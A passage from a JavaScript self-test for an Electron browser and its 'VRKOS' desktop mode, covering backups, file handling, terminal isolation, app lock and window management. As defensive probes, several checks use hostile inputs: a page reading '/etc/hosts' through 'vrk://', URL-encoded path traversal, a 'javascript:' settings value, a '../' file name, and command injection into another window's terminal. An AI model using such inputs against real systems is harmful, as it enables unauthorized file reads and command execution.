        JSON.stringify({ single, boxes }),
      );
      vault.remove(login.id);
    }

    // ── 29. Encrypted backup ──
    {
      const { encryptBackup, decryptBackup } = require('../src/backup');
      const payload = {
        logins: [{ origin: 'https://backup.example', username: 'me', password: 'backup-test-password', totp: { secret: 'JBSWY3DPEHPK3PXP', algorithm: 'SHA1', digits: 6, period: 30, issuer: 'Ex' } }],
        never: [],
        passkeys: [],
        bookmarks: { bar: [{ title: 'Backup test', url: 'https://backup.example/' }], other: [] },
      };
      const file = await encryptBackup(payload, 'correct horse battery staple');
      const plainInFile = /backup-test-password|JBSWY3DP|backup\.example/.test(file);
      let wrong = '';
      await decryptBackup(file, 'wrong passphrase!!').catch((err) => (wrong = err.message));
      const tampered = JSON.parse(file);
      tampered.data = Buffer.from(Buffer.from(tampered.data, 'base64').map((b, i) => (i === 5 ? b ^ 1 : b))).toString('base64');
      let changed = '';
      await decryptBackup(JSON.stringify(tampered), 'correct horse battery staple').catch((err) => (changed = err.message));
      const restored = await browser.restoreBackupFrom(file, 'correct horse battery staple');
      const back = vault.forOrigin('https://backup.example')[0];
      check(
        'Encrypted backups restore, and reveal nothing without the passphrase',
        !plainInFile && /Wrong passphrase/.test(wrong) && /changed or damaged/.test(changed) && restored.logins === 1 && back?.password === 'backup-test-password' && back.totp?.secret === 'JBSWY3DPEHPK3PXP' && restored.bookmarks === 1,
        JSON.stringify(restored),
      );
      if (back) vault.remove(back.id);
      for (const node of [...bookmarks.walk()]) if (node.url === 'https://backup.example/' || node.title === 'Imported from VRK Backup') bookmarks.remove(node.id);
      let short = '';
      await encryptBackup(payload, 'short').catch((err) => (short = err.message));
      check('Backups need a real passphrase', /at least 10/.test(short));
    }

    // ── 30. Security updates ──
    {
      const { newer } = require('../src/updater');
      check('Update checks compare versions correctly', newer('44.5.2', '44.5.1') && newer('45.0.0', '44.9.9') && !newer('44.5.1', '44.5.1') && !newer('44.4.9', '44.5.0'));
      const summary = browser.updater?.summary();
      check('The updater stays off outside the installed app', summary && summary.available === false && summary.current === process.versions.electron);
    }

    // ── 31. The Features page ──
    {
      browser.openInternal('features');
      await wait(700);
      const page = await browser.ui.executeJavaScript(`({
        shown: !document.getElementById('featurespanel').hidden,
        browsers: [...document.querySelectorAll('.f-table thead th')].map((th) => th.textContent).slice(1),
        rows: document.querySelectorAll('.f-table tbody tr:not(.f-group)').length,
        cards: document.querySelectorAll('.f-card').length,
        title: document.title,
      })`);
      check(
        'The Features page compares VRK with ten browsers and lists every feature',
        page.shown && page.browsers.length === 11 && page.browsers.includes('Tor Browser') && page.browsers.includes('UC Browser') && page.rows >= 30 && page.cards >= 40,
        `${page.rows} comparison rows, ${page.cards} feature cards`,
      );
      const featuresTab = [...browser.tabs.values()].find((t) => t.internal === 'features');
      if (featuresTab) browser.closeTab(featuresTab.id);
    }

    // ── 32. VRKOS ──
    // Runs against a scratch home folder (VRK_OS_HOME), so it never reads your
    // real Desktop or Documents (and macOS never asks about them).
    if (skip.has('os') || !process.env.VRK_OS_HOME) info('VRKOS', 'skipped (set VRK_OS_HOME to a scratch folder)');
    else {
      const vrkos = browser.os;
      const { ipcMain, shell } = require('electron');
      const home = process.env.VRK_OS_HOME;
      fs.mkdirSync(path.join(home, 'Desktop'), { recursive: true });
      fs.writeFileSync(path.join(home, 'Desktop', 'Desktop note.txt'), 'on the desktop');
      const work = fs.mkdtempSync(path.join(home, 'work-'));
      const limit = (p, ms) => Promise.race([p, wait(ms).then(() => Promise.reject(new Error('timed out')))]);
      const run = (wc, code) => limit(wc.executeJavaScript(code), 8000);
      const osCall = (wc, name, ...args) => run(wc, `vrkos.call(${JSON.stringify(name)}, ...${JSON.stringify(args)}).then((value) => ({ value }), (err) => ({ error: String(err.message || err) }))`);
      const ready = async (wc) => {
        for (let i = 0; i < 100; i += 1) {
          if (await run(wc, 'document.body?.dataset.ready || ""').catch(() => '')) return true;
          await wait(100);
        }
        return false;
      };
      const osErrors = [];
      const watch = (wc, label) => wc.on('console-message', (e) => e.level === 'error' && osErrors.push(`${label}: ${e.message}`));
      const openApp = async (app, args) => {
        const id = vrkos.openApp(app, args);
        const entry = vrkos.windows.get(id);
        watch(entry.win.webContents, app);
        await ready(entry.win.webContents);
        return entry;
      };
      const browserBounds = browser.win.getBounds();

      vrkos.enter();
      watch(vrkos.desktop.webContents, 'desktop');
      const desktopReady = await ready(vrkos.desktop.webContents);
      await wait(800);
      const desk = await run(vrkos.desktop.webContents, `({
        dock: [...document.querySelectorAll('#dock .dock-item')].map((b) => b.dataset.app),
        icons: [...document.querySelectorAll('#icons > *')].map((e) => e.textContent.trim()),
        clock: document.getElementById('mb-clock').textContent,
        wallpaper: Boolean(document.querySelector('#app-bg *')) || getComputedStyle(document.getElementById('app-bg')).backgroundImage !== 'none',
      })`);
      check(
        'VRKOS opens a desktop with a dock, a clock, your Desktop files and the theme wallpaper',
        desktopReady && desk.dock.includes('browser') && desk.dock.includes('files') && desk.dock.includes('terminal') && desk.icons.some((t) => t.includes('Desktop note')) && desk.clock.length > 4 && desk.wallpaper,
        JSON.stringify(desk),
      );
      // Windows aren't attached to the desktop: attached ones can leave pages thinking they're hidden (which stops videos).
      check('VRK Browser is an ordinary window on the VRKOS desktop', vrkos.active && !browser.win.getParentWindow() && !vrkos.desktop.getParentWindow() && settings.get('osActive') === true);
      // Filling the screen and leaving must never change the desktop window's style (macOS can refuse that and quit VRK).
      const firstDesktop = vrkos.desktop;
      vrkos.enter(); // the menu item again, while VRKOS is open
      check(
        'Choosing VRKOS Desktop again shows the desktop instead of leaving, and its window never changes style',
        vrkos.active && vrkos.desktop === firstDesktop && !firstDesktop.isFullScreenable() && !firstDesktop.isResizable() && !firstDesktop.isMinimizable() && !firstDesktop.isMaximizable(),
      );

      // Only VRKOS's own windows may use its calls.
      const handler = ipcMain._invokeHandlers.get('vrkos:call');
      const refused = async (sender) => {
        try {
          await handler({ sender, senderFrame: sender.mainFrame }, 'list', home);
          return false;
        } catch (err) {
          return /Not allowed/.test(err.message);
        }
      };
      const pageTab = browser.createTab(`${local}/headers`);
      await wait(800);
      check('Web pages and the browser UI can’t use VRKOS’s file and terminal calls', (await refused(browser.ui)) && (await refused(pageTab.wc)));
      const pageProbe = await pageTab.wc.executeJavaScript(`Promise.all([
        fetch('vrk://file/?path=/etc/hosts').then((r) => r.text()).then((t) => (t.includes('localhost') ? 'read' : 'refused'), () => 'refused'),
        fetch('vrk://os/desktop.html').then((r) => (r.ok ? 'read' : 'refused'), () => 'refused'),
      ])`);
      check('Web pages can’t read your files or VRKOS pages through vrk://', pageProbe.every((r) => r === 'refused'), pageProbe.join(', '));
      browser.closeTab(pageTab.id);

      // Files
      const filesApp = await openApp('files', { path: work });
      const fw = filesApp.win.webContents;
      const folder = (await osCall(fw, 'make-folder', work, 'Projects')).value;
      const file = (await osCall(fw, 'make-file', work, 'todo.txt')).value;
      await osCall(fw, 'write-text', file, 'buy milk\nfinish VRKOS');
      const text = (await osCall(fw, 'read-text', file)).value;
      const renamed = (await osCall(fw, 'rename', file, 'list.txt')).value;
      const copied = (await osCall(fw, 'copy', [renamed], work)).value;
      const moved = (await osCall(fw, 'move', [copied[0]], folder)).value;
      const listing = (await osCall(fw, 'list', work)).value;
      check(
        'Files makes, writes, reads, renames, copies and moves files (never overwriting)',
        text === 'buy milk\nfinish VRKOS' &&
          path.basename(renamed) === 'list.txt' &&
          path.basename(copied[0]) === 'list 2.txt' &&
          fs.existsSync(path.join(folder, 'list 2.txt')) &&
          listing.entries.map((e) => e.name).sort().join() === 'Projects,list.txt',
        JSON.stringify(listing.entries.map((e) => e.name)),
      );
      const badName = await osCall(fw, 'rename', renamed, '../escape.txt');
      const intoItself = await osCall(fw, 'move', [folder], folder);
      fs.writeFileSync(path.join(work, 'blob.bin'), Buffer.from([0, 1, 2, 3, 0, 255]));
      const binary = await osCall(fw, 'read-text', path.join(work, 'blob.bin'));
      check('Files refuses bad names, folders inside themselves and opening binaries as text', /can’t be used/.test(badName.error) && /inside itself/.test(intoItself.error) && /isn’t a text file/.test(binary.error));
      const trashed = [];
      const realTrash = shell.trashItem;
      shell.trashItem = async (p) => trashed.push(p); // the self-test doesn't fill your real Trash
      await osCall(fw, 'trash', [path.join(work, 'blob.bin')]);
      shell.trashItem = realTrash;
      check('Deleting in Files moves to the Trash (never erases)', trashed.length === 1 && trashed[0] === path.join(work, 'blob.bin'));
      const ranged = await vrkos.serveFile(new Request('vrk://file/', { headers: { range: 'bytes=0-3' } }), renamed);
      const preview = `${ranged.status}:${await ranged.text()}`;
      check('File previews stream with seeking (byte ranges)', preview === '206:buy ', preview);
      const traversal = ['vrk://os/%2e%2e/index.js', 'vrk://os/..%2Findex.js', 'vrk://os/%2e%2e%2f%2e%2e%2fmain.js'].map((u) => vrkos.serve(new Request(u)).status);
      const inPage = await run(fw, `fetch('https://example.com/').then(() => 'reached', () => 'blocked')`);
      const inSession = await limit(vrkos.session.fetch('https://example.com/'), 8000).then(() => 'reached', () => 'blocked');
      osErrors.length = 0; // the page's own refusal of that fetch is logged as a console error
      check('VRKOS windows can’t reach the internet or VRK’s own code', traversal.every((s) => s === 404) && inPage === 'blocked' && inSession === 'blocked', `${traversal} ${inPage} ${inSession}`);

      // Terminal: a real shell, and only its own window can type into it.
      const term = await openApp('terminal');
      const tw = term.win.webContents;
      await run(tw, `window.__out = ''; vrkos.on('pty-data', ({ data }) => (window.__out += data)); true`);
      const ptyId = (await osCall(tw, 'pty-create', { cols: 100, rows: 30, cwd: work })).value;
      const notesApp = await openApp('notes');
      const nw = notesApp.win.webContents;
      await wait(1500);
      await run(nw, `vrkos.ptyWrite(${JSON.stringify(ptyId)}, 'echo HIJACK_$((2*3))\\r'); true`);
      await osCall(nw, 'pty-kill', ptyId);
      await run(tw, `vrkos.ptyWrite(${JSON.stringify(ptyId)}, 'echo VRK_$((6*7)); pwd\\r'); true`);
      let out = '';
      for (let i = 0; i < 80 && !out.includes('VRK_42'); i += 1) {
        await wait(100);
        out = await run(tw, 'window.__out');
      }
      check('Terminal runs your real shell in the folder it was opened in', out.includes('VRK_42') && out.includes(path.basename(work)), out.slice(-120).replace(/\s+/g, ' '));
      check('Other VRKOS windows can’t type into or close a terminal', !out.includes('HIJACK_6') && vrkos.ptys.has(ptyId));

      // Notes and Calendar are encrypted on disk.
      const note = (await osCall(nw, 'notes-save', { text: 'VRKOS secret note 7731' })).value;
      const event = (await osCall(nw, 'events-save', { date: '2026-10-04', text: 'VRKOS dentist 7731' })).value;
      const badEvent = await osCall(nw, 'events-save', { date: 'tomorrow', text: 'x' });
      const notes = (await osCall(nw, 'notes-list')).value;
      const events = (await osCall(nw, 'events-list')).value;
      const onDisk = fs.readFileSync(vrkos.notes.file).toString('latin1');
      check(
        'Notes and calendar events save, and are encrypted on disk',
        notes.some((n) => n.id === note.id) && events.some((e) => e.id === event.id) && badEvent.error && !onDisk.includes('7731'),
      );

      check('VRKOS app windows are ordinary windows too', [...vrkos.windows.values()].every((w) => !w.win.getParentWindow()));

      // The macOS helper (full screen, desktop level, running apps) and the menu bar.
      let helper = null;
      try {
        helper = require('../src/os/native/vrkos.node');
      } catch {}
      const running = helper?.runningApps?.() || [];
      check(
        'The VRKOS macOS helper loads and lists running Mac apps',
        helper && ['setFullScreen', 'setWindowLevel', 'safeAreaTop', 'activateApp', 'hideApp', 'quitApp', 'hideOtherApps', 'showAllApps'].every((f) => typeof helper[f] === 'function') && Array.isArray(running) && running.every((a) => a.pid > 1 && a.pid !== process.pid),
        `${running.length} running`,
      );
      const net = (await osCall(fw, 'network-info')).value;
      const vol = (await osCall(fw, 'volume')).value;
      const perms = (await osCall(fw, 'permissions')).value;
      check(
        'The menu bar reads network, sound and permissions',
        net && typeof net.wifiPower === 'boolean' && Array.isArray(net.addresses) && vol && vol.level >= 0 && vol.level <= 100 && perms && 'fullDisk' in perms && perms.fullScreen === true,
        `${net?.addresses.length} connections, volume ${vol?.level}%, Full Disk Access ${perms?.fullDisk}`,
      );
      const fakeApp = await osCall(fw, 'mac-quit', 1);
      const appRaise = await osCall(fw, 'raise', true);
      const badPane = await osCall(fw, 'open-system-settings', 'javascript:alert(1)');
      check('Only real running apps can be quit, only the desktop can raise itself, only known settings panes open', /isn’t running/.test(fakeApp.error) && appRaise.value === false && badPane.value === false);

      // Calculator, System Monitor, Mac and Windows apps.
      const calc = await openApp('calculator');
      const result = await run(calc.win.webContents, `calculator.press('12+30='); calculator.value()`);
      const chain = await run(calc.win.webContents, `for (let i = 0; i < 2; i += 1) dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' })); calculator.press('7*6-2/4='); calculator.value()`);
      check('Calculator works (and never runs typed code)', result === '42' && /^(10|41\.5)$/.test(chain), `${result}, ${chain}`);
      const monitor = await openApp('monitor');
      const stats = (await osCall(monitor.win.webContents, 'stats', { processes: true })).value;
      const hardware = (await osCall(monitor.win.webContents, 'hardware')).value;
      check(
        'System Monitor shows this Mac’s real CPU, memory, disk and processes',
        stats.cpu.perCore.length === os.cpus().length && stats.memory.total === os.totalmem() && stats.disk?.total > 0 && stats.processes.length > 0 && stats.processes.every((p) => p.pid > 0 && p.name) && hardware.cores === os.cpus().length,
        `${hardware.chip}, ${hardware.cores} cores`,
      );
      const badQuits = await Promise.all([0, -1, process.pid, 'abc'].map((pid) => osCall(monitor.win.webContents, 'quit-process', pid)));
      check('System Monitor can’t signal every process or quit VRK itself', badQuits.every((r) => r.error));
      const apps = (await osCall(fw, 'apps')).value;
      check('Mac Apps lists the apps on this Mac', apps.mac.length > 5 && apps.mac.some((a) => a.path === '/System/Applications/Calculator.app') && apps.builtIn.some((a) => a.id === 'terminal'), `${apps.mac.length} apps`);
      const wine = (await osCall(fw, 'wine-status')).value;
      const notApp = await osCall(fw, 'launch-mac', path.join(work, 'list.txt'));
      check('Windows Apps finds Wine; Mac Apps only launches real apps', typeof wine.installed === 'boolean' && /isn’t an app/.test(notApp.error), wine.installed ? wine.version : 'Wine not installed');
      if (!wine.installed) info('Windows Apps', 'Wine is not installed on this Mac');

      // Window management.
      vrkos.windowAction(filesApp, 'maximize');
      const area = vrkos.workArea();
      const maxed = filesApp.win.getBounds();
      vrkos.windowAction(filesApp, 'snap', 'right');
      const snapped = filesApp.win.getBounds();
      check(
        'Windows maximize and snap inside the desktop (between the menu bar and the dock)',
        maxed.y === area.y && maxed.height === area.height && snapped.x === area.x + Math.round(area.width / 2) && snapped.width === area.width - Math.round(area.width / 2),
      );
      const single = vrkos.openApp('notes');
      check('Single-window apps (Notes, Settings…) reuse their window', single === notesApp.id);

      // The browser inside VRKOS.
      vrkos.showBrowser();
      browser.win.close(); // the red button: hides it, VRK keeps running
      await wait(300);
      const hidden = !browser.win.isDestroyed() && !browser.win.isVisible() && vrkos.active;
      const tabsBefore = browser.order.length;
      vrkos.openUrl(`${local}/headers`);
      await wait(500);
      check('Closing VRK Browser in VRKOS hides it; links from VRKOS apps open in it', hidden && browser.order.length === tabsBefore + 1 && vrkos.snapshot().focused === 'browser');
      browser.closeTab(browser.activeId);
      const openerProbe = await run(fw, `window.open('https://example.com/from-vrkos'); 'ok'`);
      await wait(500);
      check('Web links clicked inside VRKOS apps open in VRK Browser', openerProbe === 'ok' && browser.order.some((id) => browser.tabs.get(id)?.wc.getURL().includes('from-vrkos')));
      const fromApp = browser.order.find((id) => browser.tabs.get(id)?.wc.getURL().includes('from-vrkos'));
      if (fromApp) browser.closeTab(fromApp);

      // App lock covers VRKOS.
      settings.set('appLock', true);
      browser.unlockApproval = async () => true; // stands in for Touch ID
      browser.lock();
      await wait(300);
      const whileLocked = await osCall(fw, 'list', work);
      const lockScreen = await run(vrkos.desktop.webContents, `!document.getElementById('lock').hidden`);
      check('App lock covers VRKOS: windows hide, the lock screen shows, files are off-limits', /locked/.test(whileLocked.error) && lockScreen && [...vrkos.windows.values()].every((w) => !w.win.isVisible()));
      await browser.unlock();
      await wait(300);
      check('Unlocking brings VRKOS back', !(await run(vrkos.desktop.webContents, `!document.getElementById('lock').hidden`)) && !(await osCall(fw, 'list', work)).error);
      settings.set('appLock', false);
      browser.unlockApproval = null;

      check('No errors in any VRKOS window', osErrors.length === 0, osErrors[0]);

      // Leaving VRKOS puts everything back.
      const termPid = vrkos.ptys.get(ptyId)?.pty.pid;
      vrkos.leave(); // what the menus and the desktop's Exit use: after the click has finished
      const stillOpenDuringClick = vrkos.active;
      await wait(500);
      let shellGone = true;
      try {
        process.kill(termPid, 0);
        shellGone = false;
      } catch {}
      const back = browser.win.getBounds();
      check(
        'Leaving VRKOS closes its apps and shells and gives VRK Browser back its window',
        stillOpenDuringClick && !vrkos.active && vrkos.windows.size === 0 && vrkos.ptys.size === 0 && shellGone && !browser.win.getParentWindow() && back.width === browserBounds.width && back.height === browserBounds.height && settings.get('osActive') === false,
      );
    }

    // ── 14. Closing the window with tabs and extensions open (the quit path) ──
    app.removeAllListeners('window-all-closed'); // stay alive long enough to report
    browser.createTab(`${local}/headers`);
    browser.createTab(`${local}/headers`, { background: true });
    await wait(1000);
    browser.win.destroy();
    await wait(1500);
    check('Closing the window with tabs and extensions open is clean', browser.tabs.size === 0, `${browser.tabs.size} tabs left`);
    check('No uncaught errors during the whole run', uncaught.length === 0, uncaught[0]);
    check('No errors in the browser UI', uiErrors.length === 0, uiErrors[0]);
  } catch (err) {
    check('Self-test crashed', false, err.stack);
  } finally {
    server.close();
    const failed = results.filter((r) => !r.pass).length;
    console.log(`\n${results.length - failed}/${results.length} checks passed`);
    // Leave through VRK's real quit path (erase on quit, stop Tor/VPN); errors there print as UNCAUGHT.
    process.exitCode = failed ? 1 : 0;
    setTimeout(() => app.exit(process.exitCode), 15000);
    app.quit();
  }
};
